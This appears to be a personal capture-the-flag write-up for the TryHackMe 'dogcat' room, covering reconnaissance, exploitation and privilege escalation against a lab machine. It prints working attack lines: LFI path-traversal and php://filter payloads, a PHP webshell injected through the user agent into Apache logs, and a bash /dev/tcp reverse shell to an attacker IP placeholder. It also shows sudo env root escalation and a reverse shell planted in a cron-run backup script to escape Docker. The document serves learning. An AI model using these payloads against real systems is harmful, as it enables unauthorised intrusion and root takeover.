@@ -1,0 +1,167 @@
+#+title: [THM] dogcat writeup
+
+ # Hello, this is the first writeup I have said
+
+* Reconnaissance
+First I decided to use ~masscan~ on all of the machine ports to limit the ports
+I would then run more elaborate scans. However, since that scan did not wield
+any results, I went back to good old ~nmap~.
+#+begin_code sh
+sudo nmap -Pn <MACHINE_IP>
+#+end_code
+This checks only the most frequently used ports but gave us a good place to
+start; two ports were open:
+- 22 which belongs to ~ssh~
+- 80 which signals the existence of a webserver
+After that I ran
+#+begin_code sh
+sudo nmap -A -p22,80 <MACHINE_IP>
+#+end_code
+to get more information on the software these ports were running.
+#+begin_quote
+22: OpenSSH 7.6p1, running on a Ubuntu Machine
+80: Apache 2.4.38 WebServer
+#+end_quote
+
+** Further enumeration
+*** Viewing the source code
+Just by checking the source code for the website through the /Inspect tool/ in
+Firefox, it is easy for us to see that there are two directories called dogs and
+cats, each of which holds pictures in the form of /<NO>.jpg/ where NO ranges
+from 1 to 10.
+
+*** Gobuster
+Even though it is a generally good habit to use ~gobuster~ to check for any
+useful accessible files, it was not the case in this room. In fact, I think that
+it was due to this type of scanning that I had to terminate the vm and restart
+it in order for it to respond to my /GET/ requests.
+
+* Exploitation
+We see that the website uses ~?view=dog~ to display a random picture for a dog
+or a cat respectively, pointing out that we could check for [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion][Local File
+Inclusion]].
+
+After a little bit of toying around with that, realising that the string passed
+needs to contain either /dog/ or /cat/ in order to be executed by the php
+back-end, we try to see what files we can access:
+#+begin_code php
+?view=../../../../../etc/passwd%00dog
+
+?view=dog/../../../../../etc/passwd
+
+?view=dogs
+#+end_code
+The first one showed an error about the file, while the second one proved to be
+_very_ interesting. The server side did not search for the /etc/passwd file but
+for /etc/passwd.php. The backend adds an extension to what we pass!
+
+That means, that instead of dog or cat the backend reads a dog.php or cat.php
+respectively. It may be beneficial to access it:
+
+Using a php wrapper we tailor the request to our needs:
+#+begin_quote
+?view=php://filter/convert.base64-encode/dog
+#+end_quote
+Getting back the code for /dog.php/ encoded in base64.
+To decode it, avoiding online tools one can simply use
+
+#+begin_code sh
+echo '<paste encoded code here>' > dog.b64
+base64 -d dog.b64 > dog.php
+#+end_code
+
+We do the same for /cat.php/ but it turns out that these files have no actual
+meaning. They do not reveal any useful information. This changes when we get the
+/index.php/. Inside it we realise that the ~.php~ extension that gets added to
+our requests can be changed using the ~?ext=~ parameter!
+
+** The passwd file
+Going back to previous requests we can finally see /etc/passwd!!
+#+begin_code php
+?view=dog/../../../../../etc/passwd&ext=
+#+end_code
+Completely minimal installation; Only one user has terminal access, ~root~ and
+every other account listed on passwd has ~nologin~ set as shell.
+
+Bruteforcing root over ssh does not wield any results :(
+
+** Checking the logs
+After just a little bit of googling, we can see that the apache server holds
+logs of all the requests at ~/var/log/apache2/access.log~, and it also logs the
+user agent we have used for the request.
+
+We can see now how to proceed, manually set the agent to a webshell and run all
+the commands through it. Will it work?
+
+Yup, it worked.
+
+** Webshell
+Either through ~curl~, ~burpsuite~ or ~zap~ we set the user-agent to
+#+begin_code php
+<?php system($_GET['cmd']) ?>
+#+end_code
+and modify our link so that it also has a cmd parameter, which I set to ~ls~ to
+verify that it is working
+
+** Remote shell >> Webshell
+To get from the webshell to a remote shell is nothing difficult; We open a
+listener in our machine ~nc -lvnp <port>~ and then use a /good enough/ command
+on the cmd parameter
+
+I went with this one ( after checking with ~whereis bash~ )
+#+begin_code sh
+bash -c "bash -i >& /dev/tcp/<MYIP>/<MYPORT> 0>&1"
+#+end_code
+
+/Hint/: Do not forget to encode it as url[fn:2]
+
+* Privilege escalation
+Now the difficult part is over; two of the flags are within our reach without
+even trying to gain root privileges... but what if...!
+
+Naturally the first step was to check for sudo privileges ~sudo -l~
+It lets us run ~env~ without a password, which means, pretty much that we can do
+anything we want as root on the machine.
+#+begin_code sh
+sudo env bash
+#+end_code
+
+The third flag is in the ~/root~ directory
+
+* Where do we go from here
+I started digging around the system, hoping I could find something useful to see
+where to go from there. I ran ~ls -al~ on ~/~ and discovered a ~.dockerenv~. It
+seems we're inside a Docker environment!
+
+(Well obviously, it is in the room description... Except if you forgot to read
+it thoroughly)
+
+Next stop was to check whether ~crontab -l~ had something to show... No luck there
+
+Not long after I realised that the ~/opt~ directory was nearly empty ( In
+hindsight I think it may have had been wise to check for ~du~ at that point ),
+and inside it was an interesting ~backup.sh~ file.
+
+I added a reverse shell there, opened a listener on my machine, just in case it
+was scheduled to run every now and then and kept digging. Lucky me[fn:1] after a
+little time I saw that my netcat listener was now a root shell outside of the
+docker environment!!
+
+Getting the flag from there was extremely easy.
+* Summary
+Even though I had met and toyed around with LFI before, it was the first time I
+had to use it in a CTF room and proved to be quite interesting to me, relying on
+[[https://github.com/swisskyrepo/PayloadsAllTheThings][PayloadsAllTheThings]] to get some information on techniques and places to start
+
+Also, it was interesting to see the docker aspect of the room, which I could not
+understand even hours after completing the room ( it seemed way too simple )
+
+* Footnotes
+[fn:2] Obviously one can always perform this step using many other techniques.
+This one just feels more natural to me.
+
+[fn:1] After finishing this article, I decided to check the writeups suggested
+in thm, to see if anyone had a better explanation one more logical than my
+/hunch/. It was impressively simple: The backup directory that existed in
+~/opt/backups~ was significantly /newer/ than the shell script, meaning that the
+machine was backed up regularly
